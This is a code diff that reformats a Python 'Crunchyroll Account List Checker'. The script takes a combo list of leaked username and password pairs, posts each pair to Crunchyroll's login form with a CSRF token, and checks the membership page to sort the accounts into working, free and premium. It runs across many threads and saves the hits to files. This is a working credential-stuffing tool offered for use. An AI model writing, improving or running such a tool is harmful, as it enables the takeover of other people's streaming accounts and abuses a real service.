@@ -63,8 +63,18 @@ def check(name, threadid):
 				user=user.strip()
 				passw=passw.strip()
 				
-				sess.post("https://www.crunchyroll.com/login", data={"login_form[name]":user, "login_form[password]":passw, "login_form[redirect_url]":"/", "login_form[_token]":csrftok}, headers=headerz, cookies={"PHPSESSID":phpsess})
-				testacc = sess.get("https://www.crunchyroll.com/acct/membership", headers=headerz, cookies={"PHPSESSID":phpsess, "c_locale":"enUS"})
+				sess.post("https://www.crunchyroll.com/login", 
+                    data={"login_form[name]":user, 
+                        "login_form[password]":passw,
+                        "login_form[redirect_url]":"/",
+                        "login_form[_token]":csrftok},
+                        headers=headerz,
+                        cookies={"PHPSESSID":phpsess})
+                        
+				testacc = sess.get("https://www.crunchyroll.com/acct/membership", 
+                    headers=headerz, 
+                    cookies={"PHPSESSID":phpsess, "c_locale":"enUS"})
+                    
 				testsoup = BeautifulSoup(testacc.text, "html.parser")
 				
 				if testsoup.title.string.strip() == "Crunchyroll -   Account Management":
@@ -96,9 +106,14 @@ if __name__=="__main__":
 
 	class arg:
 		pass
-	argparser = argparse.ArgumentParser(description="Crunchyroll Account List Checker made by JoaoVitorBF.", usage="%(prog)s input_file", epilog="Version: 1.0")
-	argparser.add_argument("inputfile", metavar="input_file", help="inputs a combo list text file to be used.")
-	argparser.add_argument("threads", metavar="number_of_threads", help="specifies the number of threads to use (recommended max of 20).")
+	argparser = argparse.ArgumentParser(description="Crunchyroll Account List Checker made by JoaoVitorBF.", 
+        usage="%(prog)s input_file", 
+        epilog="Version: 1.0")
+	argparser.add_argument("inputfile", 
+        metavar="input_file", 
+        help="inputs a combo list text file to be used.")
+	argparser.add_argument("threads", metavar="number_of_threads", 
+        help="specifies the number of threads to use (recommended max of 20).")
 	argus = argparser.parse_args(namespace=arg)
 	if os.path.isfile(arg.inputfile):
 		print("File found, starting checker...")
@@ -121,7 +136,13 @@ if __name__=="__main__":
 			print("Accounts saved to text files.")
 			exit()
 		cls()
-		print("CrunchyrollChecker 1.2 by JoaoVitorBF\nTotal: "+str(total)+" | Checked: "+str(checked)+" | Working: "+str(working)+" | Free: "+str(free)+" | Premium: "+str(premium)+" | Completed: "+str(percentage)+"%")
+		print("CrunchyrollChecker 1.2 by JoaoVitorBF\nTotal: "+str(total)
+        +" | Checked: "+str(checked)
+        +" | Working: "+str(working)
+        +" | Free: "+str(free)
+        +" | Premium: "+str(premium)
+        +" | Completed: "+str(percentage)+"%")
+        
 		time.sleep(3)
 		
 #Thank you for using my script!
